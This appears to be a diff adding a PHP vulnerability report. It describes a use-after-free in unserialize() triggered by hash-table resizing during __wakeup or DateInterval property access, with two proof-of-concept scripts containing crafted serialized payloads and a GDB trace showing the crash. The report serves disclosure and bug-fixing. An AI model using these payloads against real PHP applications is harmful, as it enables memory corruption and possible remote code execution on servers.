@@ -1,0 +1,108 @@
+Description:
+------------
+Description:
+------------
+During unserialization, resizing the 'properties' hash table of a serialized object may lead to use-after-free.
+A remote attacker may exploit this bug to gain arbitrary code execution.
+
+When unserializing objects, the unserialized properties of the object are created and saved in it's 'properties' hash table. The address of these properties are saved in the 'var_hash' struct, for support in future references to them.
+However, if properties are added to this hash table during unserialization, the underlying implementation of the hash table may need to re-allocate it's arData (values) array. In the process of re-allocation, the old arData is freed and returned to the allocator and bigger array is allocated. This reult in pointers in 'var_hash' pointing to the freed memory which is now ready for allocation.
+
+This issue is somewhat related to #70211.
+
+There are (at least) two ways to trigger this behavior:
+1. Creating a new property of an object in a function which is called during unserialization.
+For example: __wakeup method is a perfect candidate.
+PoC:
+----
+<?php
+
+class foo {
+
+    function __wakeup() {
+        $this->{'x'} = 1;
+    }
+}
+
+unserialize('a:3:{i:0;O:3:"foo":8:{i:0;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;i:7;i:7;}i:1;s:263:"'.str_repeat("\06", 263).'";i:2;r:3;}');
+
+expected result: script terminates successfully.
+result: segmentation fault.
+
+
+2. Invoking the unserlying 'get_properties' method of 'DateInterval' object.
+This method updates the properties hash table of this object and may add new values to it (ext/date/php_date.c line 2349 in commit 01e798fa360bcd89980d1946503a8e0f8a2fd357).
+Since many functions use the underlying 'get_properties' method of an object, it is quite likely to find a way to trigger this bug in real-world projects.
+
+PoC:
+----
+<?php
+class foo {
+    public $x;
+    function __wakeup() {
+        var_dump($this->x);
+    }
+}
+
+unserialize('a:3:{i:0;O:3:"foo":1:{s:1:"x";O:12:"DateInterval":1:{i:0;i:0;}}i:1;s:263:"'.str_repeat("\06", 263).'";i:2;r:4;}}');
+
+expected result: script terminates successfully.
+result: segmentation fault.
+
+
+GDB (of PoC1):
+--------------
+(gdb) b object_common2
+Breakpoint 1 at 0x7cbf6c: file ext/standard/var_unserializer.re, line 505.
+(gdb) r crash.php
+Starting program: /home/yannayl/sources/php-src/sapi/cli/php crash.php
+
+Breakpoint 1, object_common2 (rval=0x7ffff445b7a0, p=0x7fffffff9f98, max=0x7ffff447a18c "", var_hash=0x7fffffff9fa0, elements=8) at ext/standard/var_unserializer.re:505
+505 {
+(gdb) b 529
+Breakpoint 2 at 0x7cc893: file ext/standard/var_unserializer.re, line 529.
+(gdb) c
+Continuing.
+
+Breakpoint 2, object_common2 (rval=0x7ffff445b7a0, p=0x7fffffff9f98, max=0x7ffff447a18c "", var_hash=0x7fffffff9fa0, elements=8) at ext/standard/var_unserializer.re:529
+529     if (has_wakeup) {
+(gdb) p *ht
+$1 = {gc = {refcount = 1, u = {v = {type = 7 '\a', flags = 0 '\000', gc_info = 0}, type_info = 7}}, u = {v = {flags = 10 '\n', nApplyCount = 0 '\000', nIteratorsCount = 0 '\000', reserve = 0 '\000'}, 
+    flags = 10}, nTableMask = 4294967288, arData = 0x7ffff445b8e0, nNumUsed = 8, nNumOfElements = 8, nTableSize = 8, nInternalPointer = 0, nNextFreeElement = 0, pDestructor = 0x895448 <_zval_ptr_dtor>}
+(gdb) p &ht->arData
+$2 = (Bucket **) 0x7ffff4455320
+(gdb) watch *0x7ffff4455320
+Hardware watchpoint 3: *0x7ffff4455320
+(gdb) c
+Continuing.
+
+Hardware watchpoint 3: *0x7ffff4455320
+
+Old value = -196757280
+New value = -196730816
+zend_hash_do_resize (ht=0x7ffff4455310) at /home/yannayl/sources/php-src/Zend/zend_hash.c:868
+868         memcpy(ht->arData, old_buckets, sizeof(Bucket) * ht->nNumUsed);
+(gdb) n
+869         pefree(old_data, ht->u.flags & HASH_FLAG_PERSISTENT);
+(gdb) p old_data
+$3 = (void *) 0x7ffff445b8c0
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000007ce466 in php_var_unserialize_internal (rval=0x7ffff445b7e0, p=0x7fffffff9f98, max=0x7ffff447a18c "", var_hash=0x7fffffff9fa0) at ext/standard/var_unserializer.re:643
+643     ZVAL_COPY(rval, rval_ref);
+(gdb) p rval_ref
+$4 = (zval *) 0x7ffff445b8e0
+(gdb) p *rval_ref
+$5 = {value = {lval = 434041037028460038, dval = 1.2132797677859895e-279, counted = 0x606060606060606, str = 0x606060606060606, arr = 0x606060606060606, obj = 0x606060606060606, res = 0x606060606060606, 
+    ref = 0x606060606060606, ast = 0x606060606060606, zv = 0x606060606060606, ptr = 0x606060606060606, ce = 0x606060606060606, func = 0x606060606060606, ww = {w1 = 101058054, w2 = 101058054}}, u1 = {
+    v = {type = 6 '\006', type_flags = 6 '\006', const_flags = 6 '\006', reserved = 6 '\006'}, type_info = 101058054}, u2 = {next = 101058054, cache_slot = 101058054, lineno = 101058054, 
+    num_args = 101058054, fe_pos = 101058054, fe_iter_idx = 101058054, access_flags = 101058054, property_guard = 101058054}}
+(gdb) p *(var_entries *)var_hash->first
+$6 = {data = {0x7fffffffa150, 0x7ffff445b7a0, 0x7ffff445b8e0, 0x7ffff445b900, 0x7ffff445b920, 0x7ffff445b940, 0x7ffff445b960, 0x7ffff445b980, 0x7ffff445b9a0, 0x7ffff445b9c0, 0x7ffff445b7c0, 
+    0x7ffff445b7e0, 0x0 <repeats 1012 times>}, used_slots = 12, next = 0x0}
+
+
+
+
